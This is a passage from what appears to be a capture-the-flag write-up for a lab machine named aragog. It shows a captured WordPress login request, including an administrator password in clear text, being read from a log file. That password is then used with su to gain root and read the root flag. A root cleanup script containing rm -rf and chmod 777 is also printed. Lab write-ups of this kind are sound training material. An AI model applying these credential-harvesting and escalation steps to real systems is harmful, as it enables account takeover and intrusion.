systemd-private-6f815f27dd9747ce808ec186c30db8ce-colord.service-eYf40O  systemd-private-6f815f27dd9747ce808ec186c30db8ce-systemd-timesyncd.service-GUqlj0  vmware-root
florian@aragog:/var/www/html/dev_wiki$
florian@aragog:/var/www/html/dev_wiki$ cat /tmp/request.log
Array
(
    [pwd] => !KRgYs(JFO!&MTr)lf
    [wp-submit] => Log In
    [testcookie] => 1
    [log] => Administrator
    [redirect_to] => http://127.0.0.1/dev_wiki/wp-admin/
)
florian@aragog:/var/www/html/dev_wiki$
```

###### Root flag

```sh
florian@aragog:/var/www/html/dev_wiki$ su -
Password:
root@aragog:~# id
uid=0(root) gid=0(root) groups=0(root)
root@aragog:~# cd /root
root@aragog:~# ls -l
total 8
-rw-r--r-- 1 root root 168 Dec 23  2017 restore.sh
-r--r--r-- 1 root root  33 Dec 22  2017 root.txt
root@aragog:~# cat root.txt
9a9da52d7aad358699a96a5754595de6
root@aragog:~#
```

```sh
root@aragog:~# cat restore.sh
rm -rf /var/www/html/dev_wiki/
cp -R /var/www/html/zz_backup/ /var/www/html/dev_wiki/
chown -R cliff:cliff /var/www/html/dev_wiki/
chmod -R 777 /var/www/html/dev_wiki/
root@aragog:~#
```